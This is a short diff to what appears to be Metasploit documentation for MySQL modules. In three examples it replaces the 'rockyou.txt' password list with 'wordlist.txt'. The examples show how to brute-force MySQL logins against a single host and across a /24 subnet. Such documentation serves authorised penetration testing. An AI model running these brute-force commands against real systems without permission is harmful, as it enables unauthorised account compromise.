@@ -42,14 +42,14 @@ Brute-force host with known user and password list:
 
 ```
 use auxiliary/scanner/mysql/mysql_login
-run mysql://known_user@192.168.222.1 threads=50 pass_file=./rockyou.txt
+run mysql://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
 ```
 
 Brute-force credentials:
 
 ```
 use auxiliary/scanner/mysql/mysql_login
-run mysql://192.168.222.1 threads=50 user_file=./users.txt pass_file=./rockyou.txt
+run mysql://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
 ```
 
 Brute-force credentials in a subnet:
@@ -57,7 +57,7 @@ Brute-force credentials in a subnet:
 ```
 use auxiliary/scanner/mysql/mysql_login
 run cidr:/24:mysql://user:pass@192.168.222.0 threads=50
-run cidr:/24:mysql://user@192.168.222.0 threads=50 pass_file=./rockyou.txt
+run cidr:/24:mysql://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
 ```
 
 ### MySQL Dumping
